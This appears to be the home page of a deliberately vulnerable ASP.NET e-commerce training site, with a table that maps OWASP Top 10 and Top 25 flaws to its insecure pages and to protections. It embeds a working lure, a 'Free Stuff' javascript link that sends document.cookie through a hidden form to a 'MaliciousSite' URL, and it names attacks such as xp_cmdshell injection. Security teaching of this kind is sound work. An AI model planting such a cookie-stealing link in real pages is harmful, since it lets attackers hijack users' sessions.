<%@ Page Language="VB" AutoEventWireup="false" CodeFile="Default.aspx.vb" Inherits="_Default" %>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
    <style type="text/css">

        .style7
        {
            color: #0066CC;
            font-size: small;
            font-weight: bold;
        }
        .style1
        {
            text-align: right;
            font-family: Arial, Helvetica, sans-serif;
            font-weight: bold;
            font-size: large;
        }
        .style2
        {
            font-size: small;
        }
        .style3
        {
            text-align: center;
            font-family: Arial, Helvetica, sans-serif;
            font-weight: bold;
            font-size: x-large;
        }
        .style5
        {
            text-align: center;
        }
        .style4
        {
            font-family: Arial, Helvetica, sans-serif;
            font-weight: bold;
        }
        .style12
        {
            text-align: center;
            font-family: Arial, Helvetica, sans-serif;
            font-size: large;
            font-weight: 700;
            color: #FF0000;
        }
        .style14
        {
            font-family: Arial, Helvetica, sans-serif;
            font-size: small;
            font-weight: bold;
            color: #0099CC;
        }
        .style13
        {
            font-family: Arial, Helvetica, sans-serif;
            font-size: small;
            color: #0099CC;
        }
        </style>
</head>
<body>
    <form id="form1" runat="server">
    <div class="style7">
        <asp:Label ID="lblUsername" runat="server" style="font-size: small" 
            Text="Hello, Guest"></asp:Label>
    </div>
    <div class="style1">
        <span class="style2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Insecure: <a href="../../Login.aspx">Login</a> |
        <a href="../../Register.aspx">Register</a> | <a href="../../Register1.aspx">
        Register1</a> | <a href="../../FileUpload.aspx">File Upload</a> |
        <a href="../../Product.aspx">Products</a>
        <br />
        <br />
        </span>
    </div>
    <div class="style1">
        <span class="style2">Secure: <a href="../../SecureLogin.aspx">Login</a> |
        <a href="../../SecureRegister.aspx">Register</a> |
        <a href="../../SecureFileUpload.aspx">File Upload</a> |
        <a href="../../SecureProduct.aspx">Products</a>
        <br />
        <br />
        </span>
    </div>
    <div class="style3">
        Welcome To my E-Commerce!
    </div>
    <div class="style5">
        <span class="style4">Search Products:</span>
        <asp:TextBox ID="txtProduct" runat="server" Width="267px"></asp:TextBox>
        &nbsp;
        <asp:Button ID="btnSearch" runat="server" Height="25px" 
            onclick="btnSearch_Click" Text="Search" />
        <br />
    </div>
    </form>
    <form action="http://localhost:1298/MaliciousSite/Default.aspx" method="get" 
    name="MaliciousForm">
    <input id="MaliciousControl" name="MaliciousControl" type="hidden" value="" />
    </form>
    <p style="font-family: Arial, Helvetica, sans-serif; font-size: small">
        <a href="javascript:document.forms['MaliciousForm'].MaliciousControl.value=document.cookie; document.forms['MaliciousForm'].submit();">
        Free Stuff Hurry Up...</a></p>
    <p class="style12">
        *******************************************</p>
    <p class="style12">
        Note:
        <br />
    </p>
    <table border="1" 
        style="width:100%; font-family: Arial, Helvetica, sans-serif; font-size: small;">
        <tr>
            <td class="style12">
                OWASP Top 10</td>
            <td class="style12">
                Top 25 Programming Errors</td>
            <td class="style12">
                &nbsp;Vulnerable Pages</td>
            <td class="style12">
                Protection</td>
        </tr>
        <tr>
            <td class="style7">
                A1: Cross-Site Scripting (XSS)</td>
            <td class="style7">
                B2: Improper Encoding or Escaping of Output;<br />
                B4: XSS;<br />
                B14: Code Injection;<br />
                B25: Client-Side Enforcement of Server-Side</td>
            <td>
                A1, B2, B4, B14: Default (search), Product; (Failure to preserve web page 
                structure)<br />
                B25: Register, Register1</td>
            <td>
                1. AntiXss.HtmlEncode(output) or Server.HtmlEncode(output)<br />
                3. Use whitelist to allow only certain characters</td>
        </tr>
        <tr>
            <td class="style7">
                <span class="style7">A2: Injection Flaws</span></td>
            <td class="style7">
                B1: Improper Input Validation;<br />
                B3: SQL Injection</td>
            <td>
                A2, B1, B3: Login; (Failure to preserve SQL Query structure)<br />
                B1: Register1 (disable or delete javascripts)</td>
            <td>
                1. Use parameterized dynamic query<br />
                2. User parameterized stored procedure<br />
                3. Escape special chars<br />
                4. Use limited privilege</td>
        </tr>
        <tr>
            <td>
                <span class="style7">A3: Malicious File Execution</span></td>
            <td class="style7">
                B5: OS Command Injection;<br />
                B12: External Control of File Name or Path</td>
            <td>
                A3, B5: Login (mssql: master.dbo.xp_cmdshell injection)<br />
                A3, B12: File Upload<br />
            </td>
            <td>
                1. Do it very carefully<br />
                2. Hard-code the path<br />
                3. Put it in browse safe folder (App_Data)</td>
        </tr>
        <tr>
            <td>
                <span class="style7">A4: Insecure Direct Object Reference</span></td>
            <td>
                &nbsp;</td>
            <td>
                A4: Account.aspx?username=admin (after login)</td>
            <td>
                1. Do not expose direct object via parameters<br />
                2. Re-verify authorization at every reference</td>
        </tr>
        <tr>
            <td>
                <span class="style7">A5: Cross Site Request Forgery (CSRF)</span></td>
            <td class="style7">
                B7: CSRF</td>
            <td>
                A5, B7: Admin/Admin.aspx (during admin login) Docs/XSRFDeleteUser.htm has the 
                malicious code for CSRF - may need to change url/port info on link to match with 
                the vulnerable site)</td>
            <td>
                1. Eliminate all XSS<br />
                2. Do not allow GET requests for sensitive actions<br />
                3. Re-authenticate or digitally sign transaction
            </td>
        </tr>
        <tr>
            <td>
                <span class="style7">A6: Information Leakage &amp; Improper Error Handling</span></td>
            <td class="style7">
                B9: Error Message Information Leak</td>
            <td>
                A6, B9: Login (try with &#39; )<br />
            </td>
            <td>
                1. Have a generic error page web.config- &lt;customErrors=&quot;On&quot;...
                <br />
                2. Fail intelligently Global.asax- Application_Error<br />
                3. Provide short error msg to users while log details</td>
        </tr>
        <tr>
            <td>
                <span class="style7">A7: Broken Authentication &amp; Session Management</span></td>
            <td class="style7">
                B19: Improper Access Control (Authorization);<br />
                B21: Hard-Coded Password;<br />
                B24: Execution with Unnecessary Privileges;<br />
                B16: Improper Resource Shutdown or Release;<br />
                B11: External Control of Critical State Data;<br />
                B23: Use of Insufficiently Random Values<br />
            </td>
            <td>
                A7, B19: SecureAdmin.aspx (authenticated) -&gt; DeleteUser1.aspx (unauthticated 
                page);<br />
                A7: web.config-&gt;forms: timeout=&quot;[large minutes]&quot;;<br />
                B21: use hashed db password;
                <br />
                B24: limit privileges to db account (admin)<br />
                B16: Account.aspx-&gt;Logout - not deleting sessions and cookies<br />
                B11: Login (cookies)<br />
                B23: SecureLogin.aspx -&gt; 4 digits random number instead of GUID for session 
                token</td>
            <td>
                1. Use long complex session ID such as GUID<br />
                2. Do not use cookies to store sensitive information
                <br />
                3. Do not use query string for session id/information<br />
                4. Change password freqently<br />
                5. Enforce strong password policy<br />
                6. Store encrypted or hashed password</td>
        </tr>
        <tr>
            <td>
                <span class="style7">A8: Insecure Cryptographic Storage</span></td>
            <td class="style7">
                B20: Use of Broken or Risky Cryptographic Algorithm</td>
            <td>
                A8: Register (plain text password, MD5)</td>
            <td>
                1. Avoid storing sensitive information when possible<br />
                2. Use only approved standard algorithms such as SHA1, SHA2
            </td>
        </tr>
        <tr>
            <td>
                <span class="style7">A9: Insecure Communications</span></td>
            <td class="style7">
                B6: Clear Text Transmission of Sensitive Information</td>
            <td>
                (not using SSL)</td>
            <td>
                1. Use SSL/TLS for ALL connections that are authenticated and transmitting 
                sensitive information<br />
                2. Train users to expect valid certificates to prevent Man-in-the-Middle attack</td>
        </tr>
        <tr>
            <td>
                <span class="style7">A10: Failure To Restrict URL Access</span></td>
            <td class="style7">
                B22: Insecure Permission Assignment for Critical Resource</td>
            <td>
                A10, B22: Admin/Admin.aspx, Admin/DeleteUser1.aspx</td>
            <td>
                1. Document user roles as well as what functions and each role is authorized to 
                access<br />
                2. Test, test test
            </td>
        </tr>
    </table>
    <p>
        <span class="style14">Other Top 25 Programming Errors:</span><br 
            class="style14" />
        <span class="style14">B8: Race Condition</span><br class="style14" />
        <span class="style14">B10: Failure to Constrain Operations within the Bounds of 
        Memory Buffer (aka Buffer Overflow)</span><b><br class="style13" />
        </b><span class="style14">B13: Untrusted Search Path</span><br 
            class="style14" />
        <span class="style14">B15: Download of Code Without Integrity Check</span><br 
            class="style14" />
        <span class="style14">B16: Improper Resource Shutdown or Release</span><br 
            class="style14" />
        <span class="style14">B17: Improper Initialization</span><br class="style14" />
        <span class="style14">B18: Incorrect Calculation</span><br />
    </p>
    <p>
        &nbsp;</p>
    <p>
        &nbsp;</p>
</body>
</html>
